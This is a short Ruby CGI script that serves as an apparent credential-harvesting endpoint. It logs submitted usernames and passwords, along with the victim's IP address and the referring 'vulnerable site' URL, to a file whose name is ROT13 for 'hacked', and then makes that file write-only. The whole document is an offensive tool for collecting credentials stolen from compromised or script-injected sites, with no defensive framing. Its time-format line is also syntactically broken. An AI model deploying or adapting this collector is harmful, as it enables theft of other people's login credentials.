#!/usr/bin/env ruby

require 'cgi'
require 'uri'

cgi = CGI.new
cgi.header  #content type 'text/html'
user = URI.encode cgi['user']
pass = URI.encode cgi['pass']
time = Time.now.strftime(%D %T)

file = 'unpxrq.txt'
File.open(file, "a") do |f|
  f.puts time   #time of receiving the get request
  f.puts "#{URI.decode user}:#{URI.decode pass}"  #get data
  f.puts cgi.remote_addr    #remote user IP
  f.puts cgi.referer        #vulnerable site URL
  f.puts "--------------------------"
end
File.chmod(0200, file)    #deny permission to public

puts ""
